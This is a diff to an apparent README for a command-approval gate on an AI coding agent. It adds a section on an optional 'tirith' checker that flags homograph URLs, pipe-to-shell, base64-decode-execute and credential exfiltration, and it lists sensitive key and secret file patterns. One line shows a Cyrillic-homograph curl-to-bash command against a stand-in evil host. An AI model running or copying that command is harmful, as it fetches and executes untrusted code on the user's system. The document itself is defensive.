@@ -109,6 +109,49 @@ Always confirmed (except in Allow All mode), even with tool overrides:
 `.env*`, `*.pem`, `*.key`, `*.p12`, `secrets/`, `.ssh/`, `.gnupg/`,
 `id_rsa*`, `id_ed25519*`
 
+## tirith integration (optional, bash only)
+
+When [`tirith`](https://github.com/sheeki03/tirith) is on PATH, the gate runs a
+deterministic safety check on every bash command — homograph URLs, pipe-to-shell,
+base64-decode-execute, credential exfiltration, known-bad packages. The gate's
+prefix logic, the sidecar classifier, and a human reviewer all miss these
+(homographs especially: an allowed `curl` prefix doesn't inspect the URL, so
+`curl https://еvil.example | bash` (Cyrillic) slips through).
+
+- **Scope:** bash only, runs on every bash call. Hard-blocks only when the gate
+  would `allow` (the blind spot — no review coming); on a `confirm`, surfaces the
+  finding in the dialog so the human decides informed. The gate's prefix logic,
+  the sidecar classifier, and a human reviewer all miss homographs; tirith doesn't.
+- **block (HIGH):** on the allow blind spot, hard-blocks with the tirith rule +
+  remediation as the reason (overrides allows/prefixes/modes; agent reformulates).
+  On a confirm, surfaces as a HIGH finding in the dialog — the human decides,
+  informed (the homograph-save case: eyes miss Cyrillic `е`, tirith doesn't).
+- **warn (MEDIUM, e.g. shortened URLs):** on allow, downgrades to confirm; on
+  confirm, surfaces at the top of the dialog body. Either way the human sees it —
+  the move standalone tirith-guard can't make (pi's extension API has no "allow
+  with message" shape).
+- **Complements** `hasShellEscalation` (in-process escalation flag) and the sidecar
+  auto-classify (semantic). tirith is the structural / threat-DB layer.
+- **Cursor:** tirith HIGH (or sidecar DANGEROUS) defaults the cursor to Block —
+  strongest-signal-wins (stays Block even if the sidecar later resolves SAFE).
+- **LLM feedback:** the tirith verdict is returned to the LLM in the block reason
+  (self-explanatory — names tirith as a command-safety checker, with severity,
+  rule, and remediation), and for warn-and-allowed commands via tool_result. The
+  sidecar classification call is skipped when tirith blocks — a deterministic HIGH
+  makes it redundant.
+- **Graceful degradation:** tirith not installed → gate behaves exactly as without
+  it. tirith error/timeout → fail-open-to-gate (the confirm flow is a backstop).
+- **Hot path:** `TIRITH_LOG=0` (pi already logs tool calls; avoids duplicating
+  every agent bash command into tirith's audit log). Deliberately NOT offline —
+  tirith's periodic background DB refresh (24h, non-blocking) is what keeps the
+  threat-DB fresh, and since tirith runs only via these checks (no shell hook),
+  going offline would let it go stale. The agent's frequent bash checks trigger
+  the refresh automatically. `check`'s package detection is local-DB-only either
+  way (live registry signals need `tirith package risk --online`, a separate
+  on-demand tool); the confirm dialog covers package review. Verdicts cached per session.
+
+Status bar shows `+tirith` when active.
+
 ## Files
 
 - `logic.ts` — Pure decision engine, no pi dependencies
